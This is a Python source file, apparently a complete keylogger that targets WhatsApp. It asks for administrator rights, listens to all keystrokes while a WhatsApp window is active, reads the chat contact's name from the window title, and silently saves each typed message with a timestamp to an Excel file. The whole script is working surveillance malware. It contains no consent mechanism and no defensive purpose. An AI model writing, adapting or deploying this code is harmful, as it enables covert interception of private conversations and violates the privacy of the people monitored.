import os
import sys
import ctypes
from datetime import datetime
from pynput import keyboard
import pygetwindow as gw
from openpyxl import Workbook, load_workbook


def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not es_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARCHIVO = os.path.join(BASE_DIR, "wsp_mensajes.xlsx")

KEYWORDS_WSP = ["whatsapp"]

buffer = ""
chat_actual = "Chat_1"


if not os.path.exists(ARCHIVO):
    wb = Workbook()
    ws = wb.active
    ws.append(["Fecha", "Perfil", "Mensaje", "Link"])
    wb.save(ARCHIVO)


def obtener_perfil():
    global chat_actual

    try:
        ventana = gw.getActiveWindow()
        if ventana:
            titulo = ventana.title.strip()

            if "-" in titulo:
                perfil = titulo.split("-")[0].strip()

                if perfil.lower() != "whatsapp" and perfil != "":
                    chat_actual = perfil
                    return perfil

            return chat_actual

    except:
        pass

    return chat_actual


def es_whatsapp_activo():
    try:
        ventana = gw.getActiveWindow()
        if ventana:
            titulo = ventana.title.lower()
            return any(k in titulo for k in KEYWORDS_WSP)
    except:
        pass
    return False


def guardar(mensaje):
    try:
        wb = load_workbook(ARCHIVO)
        ws = wb.active

        fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        perfil = obtener_perfil()

        ws.append([fecha, perfil, mensaje, "https://web.whatsapp.com/"])
        wb.save(ARCHIVO)

    except:
        pass


def on_press(key):
    global buffer

    if not es_whatsapp_activo():
        return

    try:
        if key.char:
            buffer += key.char

    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "

        elif key == keyboard.Key.enter:
            mensaje = buffer.strip()

            if mensaje:
                guardar(mensaje)

            buffer = ""

        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]


try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    pass